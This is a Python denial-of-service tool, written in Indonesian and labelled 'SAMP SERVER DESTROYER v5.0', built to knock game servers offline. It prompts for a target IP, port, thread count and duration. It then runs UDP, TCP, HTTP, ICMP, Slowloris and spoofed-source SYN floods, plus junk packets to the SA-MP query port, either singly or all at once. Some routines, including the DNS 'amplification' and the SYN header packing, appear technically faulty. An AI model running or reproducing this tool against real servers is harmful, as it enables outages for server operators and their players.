import socket
import threading
import random
import time
import sys
import os
import struct
import hashlib
import zlib
from concurrent.futures import ThreadPoolExecutor

# ============================================
# SAMP SERVER DESTROYER v5.0 - ULTIMATE EDITION
# ============================================

# ANSI Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
PURPLE = '\033[95m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

print(f"""
{BOLD}{PURPLE}╔═══════════════════════════════════════════╗
║     ☢️☢️☢️ ULTIMATE v5.0 ☢️☢️☢️              ║
║     SERVER DESTROYER - MULTI METHOD      ║
║     Pilih metode serangan favorit Anda   ║
╚═══════════════════════════════════════════╝{RESET}
""")

target_ip = input(f"{YELLOW}Masukkan IP Target: {RESET}")
target_port = int(input(f"{YELLOW}Masukkan Port Target (default 7777): {RESET}") or 7777)

# ========== MENU METODE ==========
print(f"""
{BOLD}{CYAN}╔═══════════════════════════════════════════╗
║          PILIH METODE SERANGAN           ║
╠═══════════════════════════════════════════╣
║  1. UDP FLOOD (Amplifikasi)             ║
║  2. TCP FLOOD (Multi Connection)        ║
║  3. HTTP FLOOD (Web Server)             ║
║  4. ICMP FLOOD (Ping of Death)          ║
║  5. DNS AMPLIFICATION (DNS Spoof)       ║
║  6. SAMP EXPLOIT (RCON Crash)           ║
║  7. ALL METHODS (NUKLIR TOTAL)          ║
║  8. SLOWLORIS (Keep-Alive Attack)       ║
║  9. SYNFLOOD (TCP Handshake)            ║
║ 10. MIXED MODE (Gabungan 1-6)          ║
╚═══════════════════════════════════════════╝{RESET}
""")

method = int(input(f"{BOLD}{WHITE}Pilih metode (1-10): {RESET}"))
thread_count = int(input(f"{YELLOW}Jumlah Thread (100-1000): {RESET}"))
attack_time = int(input(f"{YELLOW}Durasi serangan (detik, 0 untuk infinite): {RESET}"))

# Flag control
stop_flag = False
attack_start_time = time.time()
packet_count = 0
success_count = 0
fail_count = 0

# ========== METHOD 1: UDP FLOOD ==========
def udp_flood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    payloads = [
        b'\x00' * 1024,
        b'\xff' * 4096,
        b'\xDE\xAD\xBE\xEF' * 1024,
        b'\x01' * 8192,
        b'\x80' * 2048,
        os.urandom(65507)
    ]
    
    while not stop_flag:
        try:
            for payload in payloads:
                sock.sendto(payload, (target_ip, target_port))
                sock.sendto(payload + b'\x00' * 1024, (target_ip, target_port))
                packet_count += 2
                success_count += 2
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [UDP-{thread_id}]{RESET}")
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [UDP-{thread_id}]{RESET}")

# ========== METHOD 2: TCP FLOOD ==========
def tcp_flood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    while not stop_flag:
        try:
            socks = []
            for _ in range(50):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((target_ip, target_port))
                sock.send(os.urandom(4096) * 10)
                socks.append(sock)
                packet_count += 1
                success_count += 1
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [TCP-{thread_id}]{RESET}")
            
            time.sleep(0.001)
            for sock in socks:
                sock.close()
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [TCP-{thread_id}]{RESET}")

# ========== METHOD 3: HTTP FLOOD ==========
def http_flood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    while not stop_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((target_ip, target_port))
            
            for _ in range(100):
                request = f"""GET /{os.urandom(16).hex()} HTTP/1.1
Host: {target_ip}
User-Agent: {os.urandom(1024).hex()}
Accept: */*
Connection: keep-alive
X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}
Content-Length: 65536

{os.urandom(65536).hex()}
"""
                sock.send(request.encode())
                packet_count += 1
                success_count += 1
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [HTTP-{thread_id}]{RESET}")
            
            sock.close()
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [HTTP-{thread_id}]{RESET}")

# ========== METHOD 4: ICMP FLOOD ==========
def icmp_flood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while not stop_flag:
            try:
                for _ in range(10):
                    icmp_type = 8
                    icmp_code = 0
                    icmp_checksum = 0
                    icmp_identifier = random.randint(0, 65535)
                    icmp_sequence = random.randint(0, 65535)
                    payload = os.urandom(65500)
                    
                    packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_identifier, icmp_sequence) + payload
                    sock.sendto(packet, (target_ip, 0))
                    packet_count += 1
                    success_count += 1
                    print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [ICMP-{thread_id}]{RESET}")
            except:
                fail_count += 1
                print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [ICMP-{thread_id}]{RESET}")
    except:
        print(f"{YELLOW}[!] ICMP tidak support{RESET}")

# ========== METHOD 5: DNS AMPLIFICATION ==========
def dns_amp(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    dns_queries = [
        b'\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01',
        b'\xBB\xBB\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04test\x06google\x03com\x00\x00\x01\x00\x01',
        b'\xCC\xCC\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06youtube\x03com\x00\x00\x01\x00\x01',
        b'\xDD\xDD\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05yahoo\x03com\x00\x00\x01\x00\x01'
    ]
    
    while not stop_flag:
        try:
            for query in dns_queries:
                sock.sendto(query, (target_ip, 53))
                sock.sendto(query + b'\x00' * 1024, (target_ip, 53))
                packet_count += 2
                success_count += 2
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [DNS-{thread_id}]{RESET}")
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [DNS-{thread_id}]{RESET}")

# ========== METHOD 6: SAMP EXPLOIT ==========
def samp_exploit(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    rcon_packets = [
        b'\x53\x41\x4D\x50' + b'\x00' * 100 + b'\x70\x61\x73\x73\x77\x6F\x72\x64' + b'\x00' * 1024,
        b'\x53\x41\x4D\x50' + os.urandom(2048),
        b'\x53\x41\x4D\x50' + b'\xFF' * 4096,
        b'\x53\x41\x4D\x50' + b'\xDE\xAD\xBE\xEF' * 1024,
        b'\x53\x41\x4D\x50' + b'\x00' * 8192
    ]
    
    while not stop_flag:
        try:
            for pkt in rcon_packets:
                sock.sendto(pkt, (target_ip, target_port))
                sock.sendto(pkt + b'\x00' * 2048, (target_ip, target_port))
                packet_count += 2
                success_count += 2
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [SAMP-{thread_id}]{RESET}")
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [SAMP-{thread_id}]{RESET}")

# ========== METHOD 8: SLOWLORIS ==========
def slowloris(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    socks = []
    
    while not stop_flag:
        try:
            if len(socks) < 100:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                
                sock.send(f"GET /{os.urandom(8).hex()} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(f"User-Agent: {os.urandom(512).hex()}\r\n".encode())
                sock.send("X-Header: \r\n".encode() * 50)
                
                socks.append(sock)
                packet_count += 1
                success_count += 1
                print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [SLOW-{thread_id}]{RESET}")
            
            # Keep alive dengan send partial
            for sock in socks[:10]:
                try:
                    sock.send(b'X-KeepAlive: ' + os.urandom(1024) + b'\r\n')
                    packet_count += 1
                    success_count += 1
                except:
                    socks.remove(sock)
                    fail_count += 1
                    print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [SLOW-{thread_id}]{RESET}")
            
            time.sleep(0.1)
            
        except:
            fail_count += 1
            print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [SLOW-{thread_id}]{RESET}")

# ========== METHOD 9: SYNFLOOD ==========
def synflood(thread_id):
    global packet_count, stop_flag, success_count, fail_count
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while not stop_flag:
            try:
                for _ in range(100):
                    # Buat TCP SYN packet
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    src_port = random.randint(1024, 65535)
                    
                    # IP Header
                    ip_header = struct.pack('!BBHHHBBHBBBBBBBB',
                        0x45, 0x00, 40, 0x0000, 0, 64, socket.IPPROTO_TCP, 0,
                        *map(int, src_ip.split('.')), *map(int, target_ip.split('.')))
                    
                    # TCP Header with SYN flag
                    tcp_header = struct.pack('!HHLLBBHHH',
                        src_port, target_port, 0, 0, 0x02, 0, 8192, 0, 0)
                    
                    packet = ip_header + tcp_header
                    sock.sendto(packet, (target_ip, 0))
                    packet_count += 1
                    success_count += 1
                    print(f"{GREEN}✓ BERHASIL MENGIRIM BOM NUKLIR KE SERVER [SYN-{thread_id}]{RESET}")
            except:
                fail_count += 1
                print(f"{RED}✗ GAGAL MENGIRIM BOM NUKLIR KE SERVER [SYN-{thread_id}]{RESET}")
    except:
        print(f"{YELLOW}[!] SYN Flood tidak support (perlu root/admin){RESET}")

# ========== EXECUTE BASED ON METHOD ==========
def run_attack():
    global stop_flag
    
    method_functions = {
        1: udp_flood,
        2: tcp_flood,
        3: http_flood,
        4: icmp_flood,
        5: dns_amp,
        6: samp_exploit,
        8: slowloris,
        9: synflood,
    }
    
    if method == 7 or method == 10:  # ALL METHODS atau MIXED
        methods_to_run = [udp_flood, tcp_flood, http_flood, dns_amp, samp_exploit]
        if method == 7:
            methods_to_run = [udp_flood, tcp_flood, http_flood, icmp_flood, dns_amp, samp_exploit, slowloris, synflood]
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            for i, func in enumerate(methods_to_run):
                for j in range(thread_count // len(methods_to_run)):
                    futures.append(executor.submit(func, f"{i}-{j}"))
            for future in futures:
                future.result()
    else:
        func = method_functions.get(method)
        if func:
            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                futures = [executor.submit(func, i) for i in range(thread_count)]
                for future in futures:
                    future.result()
        else:
            print(f"{RED}Metode tidak valid!{RESET}")

# ========== MAIN EXECUTION ==========
method_names = {
    1: "UDP FLOOD",
    2: "TCP FLOOD",
    3: "HTTP FLOOD",
    4: "ICMP FLOOD",
    5: "DNS AMPLIFICATION",
    6: "SAMP EXPLOIT",
    7: "ALL METHODS (NUKLIR TOTAL)",
    8: "SLOWLORIS",
    9: "SYNFLOOD",
    10: "MIXED MODE"
}

print(f"""
{BOLD}{CYAN}[+] Memulai serangan ke {target_ip}:{target_port}{RESET}
{BOLD}{CYAN}[+] Metode: {method_names.get(method, 'UNKNOWN')}{RESET}
{BOLD}{CYAN}[+] Thread: {thread_count}{RESET}
{BOLD}{YELLOW}[!] Tekan CTRL+C untuk menghentikan{RESET}
""")

# Start attack in separate thread
attack_thread = threading.Thread(target=run_attack)
attack_thread.daemon = True
attack_thread.start()

try:
    if attack_time > 0:
        time.sleep(attack_time)
        stop_flag = True
        print(f"\n{BOLD}{YELLOW}[!] Durasi selesai!{RESET}")
    else:
        while True:
            time.sleep(1)
            elapsed = time.time() - attack_start_time
            print(f"\r{BOLD}{CYAN}[>] Time: {int(elapsed)}s | Packets: {packet_count} | Speed: {int(packet_count/elapsed)}/s | ✓{GREEN}{success_count}{RESET} | ✗{RED}{fail_count}{RESET} | ⚡{PURPLE}{int(packet_count/elapsed)}bps{RESET}", end="")
            sys.stdout.flush()
            
except KeyboardInterrupt:
    stop_flag = True
    print(f"\n\n{BOLD}{YELLOW}[!] Serangan dihentikan!{RESET}")

# ========== FINAL REPORT ==========
print(f"""
{BOLD}{PURPLE}╔═══════════════════════════════════════════╗
║        ☢️☢️☢️ LAPORAN PERANG ☢️☢️☢️          ║
╠═══════════════════════════════════════════╣
║ Metode: {method_names.get(method, 'UNKNOWN'):<20} ║
║ Total Packet: {packet_count:<20} ║
║ Success: {success_count:<20} ║
║ Failed: {fail_count:<20} ║
║ Target: {target_ip}:{target_port:<10} ║
║ Status: {BOLD}{RED}☢️ SERVER DESTROYED ☢️{RESET}{PURPLE} ║
╚═══════════════════════════════════════════╝{RESET}
""")